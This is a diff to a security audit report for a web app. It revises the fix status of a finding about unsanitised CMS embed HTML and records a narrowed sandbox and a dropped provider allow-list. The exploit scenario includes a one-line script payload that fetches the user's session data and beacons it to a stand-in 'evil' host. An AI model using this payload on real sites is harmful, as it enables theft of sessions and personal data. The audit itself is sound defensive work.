@@ -168,11 +168,12 @@ The newer auth/portal API surface (Better Auth + middleware + portal routes) has
 - **Description:** `cleanRawEmbedCode` is a `stegaClean()`'d Sanity `rawEmbedCode` string rendered via `<Fragment set:html={cleanRawEmbedCode} />`. `stegaClean` does **not** sanitise HTML. Schema only has a "trusted sources" warning text, no technical control. The block is exposed in many page-builder slots (per `schema.json` references in pages).
 - **Exploit Scenario:** Any editor account inserts an Embed Block containing `<script>fetch('/portal/api/me').then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil/x',JSON.stringify(d)))</script>`. As soon as a logged-in sponsor or admin views the page, their session/PII is exfiltrated. Same vector also reachable through `iframe.src` (line 23/43) which accepts any `http(s)` URL — sandbox flags allow `same-origin allow-scripts`.
 - **Fix:** Sanitise with `isomorphic-dompurify` allowing only an explicit tag/attribute set, OR render every embed inside a sandboxed `<iframe srcdoc="...">` so it executes in an opaque origin without first-party cookie access. Also restrict `embedUrl` to an allow-list of providers (YouTube, Vimeo, Google Maps).
-- **Status: RESOLVED 2026-05-05 via Story 24.6.**
-  - `rawEmbedCode` now renders inside `<iframe srcdoc sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox">` — `allow-same-origin` dropped, opaque origin, no first-party cookie or DOM access.
-  - `embedUrl` validated at render time via `validateEmbedUrl()` (`astro-app/src/lib/embed-allowlist.ts`) against an allow-list (YouTube, YouTube-nocookie, Vimeo, Google Maps `/maps/embed`, Loom, GitHub Gist); non-allow-listed URLs render the "Embed URL not allowed" placeholder.
-  - Sanity schema (`studio/src/schemaTypes/blocks/embed-block.ts`) enforces the same allow-list with a `validation` rule for editor feedback in Studio.
-  - Layout CSP `frame-src` extended to permit the new providers.
+- **Status: RESOLVED 2026-05-05 via Story 24.6 (revised post-review).**
+  - `rawEmbedCode` and `embedUrl` both render inside `<iframe sandbox="allow-scripts allow-popups">` — no `allow-same-origin`, no `allow-popups-to-escape-sandbox`. Opaque origin, no first-party cookie or DOM access; clicked-link popups stay sandboxed (cannot escape to a non-sandboxed top-level page).
+  - `validateEmbedUrl()` (`astro-app/src/lib/embed-allowlist.ts`) accepts any `https://` URL with no userinfo (rejects `http:`, `blob:`, `javascript:`, credentialed URLs). The provider allow-list was deliberately dropped post-review (Jay, 2026-05-05): trust model assumes authenticated Sanity editors are not adversarial; sandbox iframe is the sole defense for the `embedUrl` path.
+  - Sanity schema (`studio/src/schemaTypes/blocks/embed-block.ts`) requires `https://`-only URLs via `Rule.uri({scheme: ['https']})`; no host allow-list.
+  - Layout CSP `frame-src` is `'self' https:` — broad, deliberately matching the relaxed editor trust model.
+  - Residual risk: a compromised editor account can iframe arbitrary `https://` URLs (cryptojacking, postMessage shenanigans against parent, drive-by-download attempts). First-party cookie/PII exfiltration remains blocked by the sandbox.
 
 ### M-9: `auth-config.ts:81` — `requestOrigin` reflected into `baseURL`
 Bundled into M-3 above (same root cause; itemised here for reviewer ergonomics — single fix covers both).
